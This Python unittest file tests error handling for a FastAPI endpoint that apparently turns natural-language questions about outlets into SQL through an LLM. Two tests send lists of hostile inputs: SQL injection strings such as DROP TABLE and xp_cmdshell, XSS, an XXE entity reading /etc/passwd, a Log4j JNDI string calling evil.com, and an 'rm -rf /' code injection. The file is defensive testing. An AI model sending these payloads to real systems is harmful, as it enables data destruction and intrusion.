import unittest
import sys
import os
from unittest.mock import patch, Mock
from fastapi.testclient import TestClient

# Add parent directories to path to import from Question_4
sys.path.append(os.path.join(os.path.dirname(__file__), '../../Question_4'))

from app.main import app

client = TestClient(app)


class TestUnhappyOutlets(unittest.TestCase):
    """Test suite for unhappy flows in outlets endpoint"""
    
    def test_missing_query_param(self):
        """Test missing required query parameter"""
        response = client.get("/outlets")
        self.assertEqual(response.status_code, 422)  # FastAPI validation error
        
        error_detail = response.json()
        self.assertIn("detail", error_detail)
        # Should indicate query parameter is required
        self.assertTrue(
            any("query" in str(detail).lower() for detail in error_detail["detail"])
        )
    
    def test_empty_query_param(self):
        """Test empty query parameter"""
        response = client.get("/outlets", params={"query": ""})
        self.assertEqual(response.status_code, 422)  # Min length validation
        
        error_detail = response.json()
        self.assertIn("detail", error_detail)
    
    def test_query_too_short(self):
        """Test query parameter that's too short (less than min_length=3)"""
        short_queries = ["a", "ab", "  "]
        
        for query in short_queries:
            with self.subTest(query=query):
                response = client.get("/outlets", params={"query": query})
                self.assertEqual(response.status_code, 422)
                
                error_detail = response.json()
                self.assertIn("detail", error_detail)
    
    @patch.dict(os.environ, {}, clear=True)
    def test_missing_openai_api_key(self):
        """Test behavior when OpenAI API key is not configured"""
        # Clear environment variables to simulate missing API key
        response = client.get("/outlets", params={"query": "outlets in PJ"})
        self.assertEqual(response.status_code, 503)
        
        error_detail = response.json()
        self.assertIn("OpenAI API key not configured", error_detail["detail"])
    
    @patch('app.outlets.SQLDatabaseChain.from_llm')
    def test_sql_chain_initialization_failure(self, mock_sql_chain):
        """Test when SQL chain fails to initialize"""
        mock_sql_chain.side_effect = Exception("Failed to connect to database")
        
        response = client.get("/outlets", params={"query": "show all outlets"})
        self.assertEqual(response.status_code, 500)
        
        error_detail = response.json()
        self.assertIn("Internal server error", error_detail["detail"])
        self.assertIn("Failed to connect to database", error_detail["detail"])
    
    # Removed excessive SQL failure simulation tests for concise suite
    
    @patch('app.outlets.OpenAI')
    def test_openai_api_failure(self, mock_openai):
        """Test when OpenAI API calls fail"""
        mock_openai.side_effect = Exception("OpenAI API error: Rate limit exceeded")
        
        response = client.get("/outlets", params={"query": "find outlets"})
        self.assertEqual(response.status_code, 500)
        
        error_detail = response.json()
        self.assertIn("Internal server error", error_detail["detail"])
        self.assertIn("OpenAI API error", error_detail["detail"])
    
    def test_sql_injection_attempts(self):
        """Test various SQL injection attack patterns"""
        sql_injection_payloads = [
            "'; DROP TABLE outlets; --",
            "1; DELETE FROM outlets WHERE 1=1; --",
            "' OR '1'='1",
            "' OR 1=1 --",
            "' UNION SELECT * FROM outlets --",
            "'; UPDATE outlets SET name='hacked' WHERE 1=1; --",
            "' OR EXISTS(SELECT * FROM outlets) --",
            "' AND 1=(SELECT COUNT(*) FROM outlets) --",
            "'; INSERT INTO outlets VALUES ('evil', 'evil'); --",
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
            "admin'/*",
            "' OR SLEEP(5) --",
            "'; EXEC xp_cmdshell('dir'); --",
            "' UNION ALL SELECT NULL, table_name FROM information_schema.tables --",
        ]
        
        for payload in sql_injection_payloads:
            with self.subTest(payload=payload):
                response = client.get("/outlets", params={"query": payload})
                
                # Should not crash and should return an appropriate error or safe result
                self.assertIn(response.status_code, [200, 400, 422, 500, 503])
                
                if response.status_code == 200:
                    # If it succeeds, check that the response is safe
                    response_data = response.json()
                    self.assertIn("query", response_data)
                    self.assertIn("result", response_data)
                    
                    # Result should not contain dangerous patterns
                    result = response_data.get("result", "").lower()
                    dangerous_patterns = ["drop table", "delete from", "insert into", "update", "exec"]
                    for pattern in dangerous_patterns:
                        self.assertNotIn(pattern, result)
                    
                    # Should not return actual database structure info
                    structure_patterns = ["information_schema", "table_name", "column_name"]
                    for pattern in structure_patterns:
                        self.assertNotIn(pattern, result)
    
    def test_malicious_query_payloads(self):
        """Test various other malicious query attempts"""
        malicious_queries = [
            "<script>alert('XSS')</script>",  # XSS attempt
            "../../etc/passwd",  # Path traversal
            "{{7*7}}",  # Template injection
            "__import__('os').system('rm -rf /')",  # Code injection
            "javascript:alert('XSS')",  # JavaScript injection
            "\x00\x01\x02\x03",  # Binary data
            "A" * 10000,  # Very long input
            "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",  # URL encoded XSS
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",  # XXE
            "${jndi:ldap://evil.com/exploit}",  # Log4j injection
        ]
        
        for malicious_query in malicious_queries:
            with self.subTest(query=malicious_query):
                response = client.get("/outlets", params={"query": malicious_query})
                
                # Should not crash the server
                self.assertIn(response.status_code, [200, 400, 422, 500, 503])
                
                # If it returns 200, check that response is safe
                if response.status_code == 200:
                    response_data = response.json()
                    self.assertIn("query", response_data)
                    self.assertIn("result", response_data)
                    
                    # Response should not contain dangerous content
                    result = response_data["result"].lower()
                    dangerous_patterns = ["<script", "javascript:", "file:///", "etc/passwd"]
                    for pattern in dangerous_patterns:
                        self.assertNotIn(pattern, result)
    
    def test_special_characters_in_query(self):
        """Test handling of special characters that might break SQL parsing"""
        special_queries = [
            "outlets in Petaling Jaya",  # Normal query
            "outlets with Wi-Fi",  # Hyphen
            "24/7 outlets",  # Forward slash
            "outlets (open late)",  # Parentheses
            "outlets & services",  # Ampersand
            "20% discount outlets",  # Percentage
            "outlets 'near me'",  # Single quotes
            'outlets "in KL"',  # Double quotes
            "outlets\nwith\ttabs",  # Newlines and tabs
            "café outlets",  # Unicode characters
            "outlets\\backslash",  # Backslash
            "outlets+plus+sign",  # Plus signs
            "outlets=equals=sign",  # Equals signs
        ]
        
        for query in special_queries:
            with self.subTest(query=query):
                response = client.get("/outlets", params={"query": query})
                
                # Should handle gracefully - either success or proper error
                self.assertIn(response.status_code, [200, 400, 422, 500, 503])
                
                # Should return valid JSON
                try:
                    response_data = response.json()
                    self.assertIsInstance(response_data, dict)
                except ValueError:
                    self.fail(f"Invalid JSON response for query: {query}")
    
    @patch('app.outlets.SQLDatabaseChain.from_llm')
    def test_database_connection_failure(self, mock_sql_chain):
        """Test handling of database connection failures"""
        mock_chain_instance = Mock()
        mock_chain_instance.run.side_effect = Exception("Connection to database failed")
        mock_sql_chain.return_value = mock_chain_instance
        
        response = client.get("/outlets", params={"query": "list outlets"})
        self.assertEqual(response.status_code, 500)
        
        error_detail = response.json()
        self.assertIn("Connection to database failed", error_detail["detail"])
    
    @patch('app.outlets.SQLDatabaseChain.from_llm')
    def test_timeout_simulation(self, mock_sql_chain):
        """Test timeout handling (simulated)"""
        import time
        
        def slow_run(query):
            time.sleep(0.1)  # Simulate slow database query
            return "Slow query result for " + query
        
        mock_chain_instance = Mock()
        mock_chain_instance.run = slow_run
        mock_sql_chain.return_value = mock_chain_instance
        
        # This should still complete (we're not testing actual timeouts here)
        response = client.get("/outlets", params={"query": "complex query"})
        # Just verify it handles the slow operation
        self.assertIn(response.status_code, [200, 500])
    
    def test_outlets_list_endpoint(self):
        """Test the outlets list endpoint for errors"""
        response = client.get("/outlets/list")
        # Should return list of outlets or handle database errors gracefully
        self.assertIn(response.status_code, [200, 500])
        
        if response.status_code == 200:
            data = response.json()
            self.assertIn("outlets", data)
            self.assertIsInstance(data["outlets"], list)
    
    def test_outlets_health_endpoint(self):
        """Test the outlets health endpoint"""
        response = client.get("/outlets/health")
        # Should always return something (even if unhealthy)
        self.assertIn(response.status_code, [200])
        
        health_data = response.json()
        required_fields = ["database_connected", "openai_api_available", "status"]
        
        # At least these fields should be present (might have error field too)
        for field in required_fields:
            if field not in health_data:
                # If not present, should have error field
                self.assertIn("error", health_data)
                break
        
        # Status should be one of the expected values
        if "status" in health_data:
            self.assertIn(health_data["status"], ["healthy", "degraded", "unhealthy"])
    
    def test_concurrent_requests_stability(self):
        """Test that multiple concurrent SQL requests don't cause issues"""
        import threading
        import queue
        
        results = queue.Queue()
        
        def make_request(query_suffix):
            try:
                response = client.get("/outlets", params={"query": f"outlets {query_suffix}"})
                results.put(("success", response.status_code))
            except Exception as e:
                results.put(("error", str(e)))
        
        # Start multiple concurrent requests
        threads = []
        for i in range(5):
            thread = threading.Thread(target=make_request, args=(f"test{i}",))
            threads.append(thread)
            thread.start()
        
        # Wait for all to complete
        for thread in threads:
            thread.join(timeout=10)
        
        # Check results
        while not results.empty():
            result_type, result_value = results.get()
            if result_type == "success":
                self.assertIn(result_value, [200, 400, 422, 500, 503])  # Valid status codes
            else:
                # Log errors but don't fail (concurrent requests might have issues)
                print(f"Concurrent request error: {result_value}")
    
    def test_invalid_database_queries(self):
        """Test queries that would generate invalid SQL"""
        invalid_queries = [
            "Show me everything about nothing",
            "Calculate the meaning of life",
            "Delete all my files",
            "Show me the matrix",
            "Query the quantum realm",
            "Find aliens in the database",
            "Show me yesterday's tomorrow",
        ]
        
        for query in invalid_queries:
            with self.subTest(query=query):
                response = client.get("/outlets", params={"query": query})
                
                # Should handle gracefully without crashing
                self.assertIn(response.status_code, [200, 400, 422, 500, 503])
                
                # If it's a 400, should have helpful error message
                if response.status_code == 400:
                    error_detail = response.json()
                    self.assertIn("couldn't translate", error_detail["detail"])


if __name__ == "__main__":
    unittest.main() 